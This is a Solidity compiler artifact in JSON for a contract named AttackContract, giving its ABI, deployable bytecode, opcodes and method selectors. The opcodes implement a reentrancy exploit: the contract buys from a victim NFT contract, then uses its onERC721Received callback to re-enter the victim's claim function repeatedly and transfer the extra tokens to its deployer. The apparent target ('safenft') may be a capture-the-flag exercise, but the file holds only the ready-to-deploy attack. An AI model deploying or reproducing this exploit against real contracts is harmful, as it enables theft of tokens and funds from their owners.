{"contracts/safenft.sol":{"AttackContract":{"abi":[{"inputs":[{"internalType":"address","name":"victimAddr","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"attackStepOne","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"attackStepTwo","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"","type":"bytes"}],"name":"onERC721Received","outputs":[{"internalType":"bytes4","name":"","type":"bytes4"}],"stateMutability":"nonpayable","type":"function"}],"evm":{"bytecode":{"linkReferences":{},"object":"608060405234801561001057600080fd5b50604051610835380380610835833981810160405281019061003291906100d6565b336000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555080600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550600060028190555050610151565b6000815190506100d08161013a565b92915050565b6000602082840312156100ec576100eb610135565b5b60006100fa848285016100c1565b91505092915050565b600061010e82610115565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600080fd5b61014381610103565b811461014e57600080fd5b50565b6106d5806101606000396000f3fe6080604052600436106100345760003560e01c8063033125a514610039578063150b7a02146100505780635ebf1f941461008d575b600080fd5b34801561004557600080fd5b5061004e610097565b005b34801561005c57600080fd5b50610077600480360381019061007291906103a5565b61011b565b604051610084919061048c565b60405180910390f35b610095610286565b005b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e71d92d6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561010157600080fd5b505af1158015610115573d6000803e3d6000fd5b50505050565b60006005600254101561027457600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd3060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16866040518463ffffffff1660e01b81526004016101a793929190610455565b600060405180830381600087803b1580156101c157600080fd5b505af11580156101d5573d6000803e3d6000fd5b50505050600260008154809291906101ec906105a5565b9190505550600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16634e71d92d6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561025b57600080fd5b505af115801561026f573d6000803e3d6000fd5b505050505b63150b7a0260e01b9050949350505050565b600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663bff29cee346040518263ffffffff1660e01b81526004016000604051808303818588803b1580156102f057600080fd5b505af1158015610304573d6000803e3d6000fd5b5050505050565b600061031e610319846104cc565b6104a7565b90508281526020810184848401111561033a57610339610651565b5b610345848285610565565b509392505050565b60008135905061035c81610671565b92915050565b600082601f8301126103775761037661064c565b5b813561038784826020860161030b565b91505092915050565b60008135905061039f81610688565b92915050565b600080600080608085870312156103bf576103be61065b565b5b60006103cd8782880161034d565b94505060206103de8782880161034d565b93505060406103ef87828801610390565b925050606085013567ffffffffffffffff8111156104105761040f610656565b5b61041c87828801610362565b91505092959194509250565b610431816104fd565b82525050565b6104408161050f565b82525050565b61044f8161055b565b82525050565b600060608201905061046a6000830186610428565b6104776020830185610428565b6104846040830184610446565b949350505050565b60006020820190506104a16000830184610437565b92915050565b60006104b16104c2565b90506104bd8282610574565b919050565b6000604051905090565b600067ffffffffffffffff8211156104e7576104e661061d565b5b6104f082610660565b9050602081019050919050565b60006105088261053b565b9050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b82818337600083830152505050565b61057d82610660565b810181811067ffffffffffffffff8211171561059c5761059b61061d565b5b80604052505050565b60006105b08261055b565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff8214156105e3576105e26105ee565b5b600182019050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b600080fd5b600080fd5b600080fd5b600080fd5b6000601f19601f8301169050919050565b61067a816104fd565b811461068557600080fd5b50565b6106918161055b565b811461069c57600080fd5b5056fea26469706673582212200494ce57b6936288e355ef34f6190c5ed776ff9330ea09e31611d9aa0547ba2764736f6c63430008070033","opcodes":"PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x835 CODESIZE SUB DUP1 PUSH2 0x835 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xD6 JUMP JUMPDEST CALLER PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP DUP1 PUSH1 0x1 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 PUSH1 0x2 DUP2 SWAP1 SSTORE POP POP PUSH2 0x151 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xD0 DUP2 PUSH2 0x13A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xEC JUMPI PUSH2 0xEB PUSH2 0x135 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xFA DUP5 DUP3 DUP6 ADD PUSH2 0xC1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x10E DUP3 PUSH2 0x115 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x143 DUP2 PUSH2 0x103 JUMP JUMPDEST DUP2 EQ PUSH2 0x14E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x6D5 DUP1 PUSH2 0x160 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x33125A5 EQ PUSH2 0x39 JUMPI DUP1 PUSH4 0x150B7A02 EQ PUSH2 0x50 JUMPI DUP1 PUSH4 0x5EBF1F94 EQ PUSH2 0x8D JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x45 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x4E PUSH2 0x97 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x77 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x72 SWAP2 SWAP1 PUSH2 0x3A5 JUMP JUMPDEST PUSH2 0x11B JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x84 SWAP2 SWAP1 PUSH2 0x48C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x95 PUSH2 0x286 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4E71D92D PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x101 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x115 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x5 PUSH1 0x2 SLOAD LT ISZERO PUSH2 0x274 JUMPI PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x23B872DD ADDRESS PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP7 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x1A7 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x455 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x1C1 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x1D5 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x2 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x1EC SWAP1 PUSH2 0x5A5 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x4E71D92D PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x25B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x26F JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST PUSH4 0x150B7A02 PUSH1 0xE0 SHL SWAP1 POP SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xBFF29CEE CALLVALUE PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP6 DUP9 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x2F0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x304 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x31E PUSH2 0x319 DUP5 PUSH2 0x4CC JUMP JUMPDEST PUSH2 0x4A7 JUMP JUMPDEST SWAP1 POP DUP3 DUP2 MSTORE PUSH1 0x20 DUP2 ADD DUP5 DUP5 DUP5 ADD GT ISZERO PUSH2 0x33A JUMPI PUSH2 0x339 PUSH2 0x651 JUMP JUMPDEST JUMPDEST PUSH2 0x345 DUP5 DUP3 DUP6 PUSH2 0x565 JUMP JUMPDEST POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x35C DUP2 PUSH2 0x671 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 PUSH1 0x1F DUP4 ADD SLT PUSH2 0x377 JUMPI PUSH2 0x376 PUSH2 0x64C JUMP JUMPDEST JUMPDEST DUP2 CALLDATALOAD PUSH2 0x387 DUP5 DUP3 PUSH1 0x20 DUP7 ADD PUSH2 0x30B JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x39F DUP2 PUSH2 0x688 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 DUP1 PUSH1 0x80 DUP6 DUP8 SUB SLT ISZERO PUSH2 0x3BF JUMPI PUSH2 0x3BE PUSH2 0x65B JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x3CD DUP8 DUP3 DUP9 ADD PUSH2 0x34D JUMP JUMPDEST SWAP5 POP POP PUSH1 0x20 PUSH2 0x3DE DUP8 DUP3 DUP9 ADD PUSH2 0x34D JUMP JUMPDEST SWAP4 POP POP PUSH1 0x40 PUSH2 0x3EF DUP8 DUP3 DUP9 ADD PUSH2 0x390 JUMP JUMPDEST SWAP3 POP POP PUSH1 0x60 DUP6 ADD CALLDATALOAD PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x410 JUMPI PUSH2 0x40F PUSH2 0x656 JUMP JUMPDEST JUMPDEST PUSH2 0x41C DUP8 DUP3 DUP9 ADD PUSH2 0x362 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP6 SWAP2 SWAP5 POP SWAP3 POP JUMP JUMPDEST PUSH2 0x431 DUP2 PUSH2 0x4FD JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x440 DUP2 PUSH2 0x50F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x44F DUP2 PUSH2 0x55B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x60 DUP3 ADD SWAP1 POP PUSH2 0x46A PUSH1 0x0 DUP4 ADD DUP7 PUSH2 0x428 JUMP JUMPDEST PUSH2 0x477 PUSH1 0x20 DUP4 ADD DUP6 PUSH2 0x428 JUMP JUMPDEST PUSH2 0x484 PUSH1 0x40 DUP4 ADD DUP5 PUSH2 0x446 JUMP JUMPDEST SWAP5 SWAP4 POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x4A1 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x437 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4B1 PUSH2 0x4C2 JUMP JUMPDEST SWAP1 POP PUSH2 0x4BD DUP3 DUP3 PUSH2 0x574 JUMP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT ISZERO PUSH2 0x4E7 JUMPI PUSH2 0x4E6 PUSH2 0x61D JUMP JUMPDEST JUMPDEST PUSH2 0x4F0 DUP3 PUSH2 0x660 JUMP JUMPDEST SWAP1 POP PUSH1 0x20 DUP2 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x508 DUP3 PUSH2 0x53B JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH32 0xFFFFFFFF00000000000000000000000000000000000000000000000000000000 DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST DUP3 DUP2 DUP4 CALLDATACOPY PUSH1 0x0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH2 0x57D DUP3 PUSH2 0x660 JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0x59C JUMPI PUSH2 0x59B PUSH2 0x61D JUMP JUMPDEST JUMPDEST DUP1 PUSH1 0x40 MSTORE POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x5B0 DUP3 PUSH2 0x55B JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 EQ ISZERO PUSH2 0x5E3 JUMPI PUSH2 0x5E2 PUSH2 0x5EE JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x67A DUP2 PUSH2 0x4FD JUMP JUMPDEST DUP2 EQ PUSH2 0x685 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH2 0x691 DUP2 PUSH2 0x55B JUMP JUMPDEST DUP2 EQ PUSH2 0x69C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 DIV SWAP5 0xCE JUMPI 0xB6 SWAP4 PUSH3 0x88E355 0xEF CALLVALUE 0xF6 NOT 0xC 0x5E 0xD7 PUSH23 0xFF9330EA09E31611D9AA0547BA2764736F6C6343000807 STOP CALLER "},"methodIdentifiers":{"attackStepOne()":"5ebf1f94","attackStepTwo()":"033125a5","onERC721Received(address,address,uint256,bytes)":"150b7a02"}}}}}